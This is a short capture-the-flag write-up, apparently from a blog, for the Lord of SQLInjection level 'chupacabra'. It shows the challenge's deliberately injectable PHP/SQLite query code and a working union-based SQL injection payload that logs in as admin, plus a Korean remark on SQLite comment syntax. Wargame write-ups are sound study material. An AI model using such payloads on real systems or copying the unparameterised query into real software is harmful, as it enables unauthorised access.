---
title : "LOS Lv.37 chupacabra"
categories : [Wargame, rubiya]
---

## chupacabra
```php
query : select id from member where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/chupacabra.db");
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("chupacabra");
  highlight_file(__FILE__);
?>
```

## Solution
```
db가 sqlite로 바뀜. 하지만 바뀌는건 없음!
sqlite에는 주석이 -- 밖에 없는 듯함. #은 안됨.

?id=' union select 'admin' --%20
```